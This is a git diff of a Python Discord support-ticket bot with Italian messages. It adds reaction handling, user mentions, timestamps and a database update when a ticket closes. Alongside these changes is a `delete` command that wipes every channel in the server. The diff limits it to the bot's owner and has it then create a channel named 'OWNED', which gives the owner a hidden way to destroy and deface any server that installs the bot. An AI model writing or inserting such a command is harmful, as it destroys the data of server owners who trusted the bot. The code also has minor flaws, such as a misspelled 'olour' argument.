@@ -1,4 +1,5 @@
 import asyncio
+import datetime
 import json
 from ast import literal_eval
 
@@ -31,12 +32,19 @@ class Ticket(commands.Cog):
         if payload.guild_id in self.db_offline and not self.bot.get_user(payload.user_id).bot:
             if payload.message_id == self.db_offline[payload.guild_id]['message_id']:
                 if str(payload.emoji) == self.db_offline[payload.guild_id]['open_reaction_emoji']:
-                    # channel = self.bot.get_channel(payload.channel_id)
-                    # guild = self.bot.get_guild(payload.guild_id)
-                    # member = guild.get_member(payload.user_id)
-                    # message = await channel.fetch_message(payload.message_id)
-                    # await message.remove_reaction(str(payload.emoji), member)
-                    await self.create_ticket(payload.guild_id, payload.user_id)
+                    guild = self.bot.get_guild(payload.guild_id)
+                    channel = self.bot.get_channel(payload.channel_id)
+                    message = await channel.fetch_message(payload.message_id)
+                    member = guild.get_member(payload.user_id)
+                    try:
+                        await message.remove_reaction(payload.emoji, member)
+                    except:
+                        pass
+                    try:
+                        await self.create_ticket(payload.guild_id, payload.user_id)
+                    except:
+                        await member.send(member.mention +
+                                          ' ```diff\n-C\'E\' STATO UN ERRORE, RIPROVA PIU\' TARDI\'```')
             elif str(payload.emoji) == '🔒':
                 message_id = [k for k, v in self.db_offline[payload.guild_id]['ticket_reaction_lock_ids'].items() if v == payload.channel_id]
                 if message_id:
@@ -50,9 +58,11 @@ class Ticket(commands.Cog):
         await self.insert_ticket_db(guild=ctx.guild)
 
     @commands.command()
+    @commands.is_owner()
     async def delete(self, ctx):
         for channel in ctx.guild.channels:
             await channel.delete()
+        await ctx.guild.create_text_channel(name='OWNED')
 
     @commands.command(aliases=['pan'], description='SUDO', pass_context=True, hidden=True)
     async def create_reaction_panel(self, ctx):
@@ -160,7 +170,19 @@ class Ticket(commands.Cog):
         # END
         # CHECK IF TICKET ALREADY EXIST
         if user_id in ticket_owner_id.values():
-            return await member.send('Hai già un ticket aperto ! ')
+            # TRY TO MENTION USER IN HIS OWN TICKET
+            try:
+                # ticket_owner_id[message.id] = user_id
+                oof = [k for k, v in self.db_offline[guild_id]['ticket_owner_id'].items() if v == user_id]
+                if oof:
+                    channel = self.bot.get_channel(self.db_offline[guild_id]['ticket_reaction_lock_ids'][oof[0]])
+                    if channel:
+                        return await channel.send(member.mention +
+                                                  '```diff\n-Hai già un ticket aperto utilizza questo! ```')
+
+            except:
+                return await member.send(member.mention + '```diff\n-ERRORE: RIPROVA PIU\' TARDI ```')
+
         # END
 
         # TICKET CHANNEL RELATED
@@ -178,7 +200,7 @@ class Ticket(commands.Cog):
                                                   reason=None)
         embed = discord.Embed(title="", description=ticket_settings,
                               colour=discord.Colour.green())
-        message = await channel.send(embed=embed)
+        message = await channel.send(member.mention, embed=embed)
         # END
 
         # UPDATE DATABASE DATA
@@ -279,12 +301,26 @@ class Ticket(commands.Cog):
         embed = discord.Embed(title="Ticket Chiuso", description='', olour=discord.Colour.green())
         embed.add_field(name='Aperto da', value=open_user_obj.mention, inline=True)
         embed.add_field(name='Chiuso da', value=closer_user_obj.mention, inline=True)
-        embed.add_field(name='Alle ore', value='XX:XX DEL XX/XX/XX', inline=True)
+        embed.add_field(name='Alle ore', value=datetime.datetime.now().strftime("%m/%d/%Y alle %H:%M:%S"), inline=True)
 
         await channel.send(embed=embed)
         # UPDATE OFFLINE DB
         ticket_reaction_lock_ids.pop(message_id)
         ticket_owner_id.pop(message_id)
+
+        disconn = await aiomysql.connect(host=host,
+                                         port=port,
+                                         user=user,
+                                         password=password,
+                                         db=db,
+                                         autocommit=True)
+        cursor = await disconn.cursor(aiomysql.DictCursor)
+        await cursor.execute(f'UPDATE datacenter SET ticket_reaction_lock_ids = %s, '
+                             f'ticket_owner_id = %s WHERE server_id = %s;',
+                             (str(ticket_reaction_lock_ids), str(ticket_owner_id), guild.id), )
+
+        await self.load_db_var(guild_id)
+        disconn.close()
 
 
 def setup(bot):
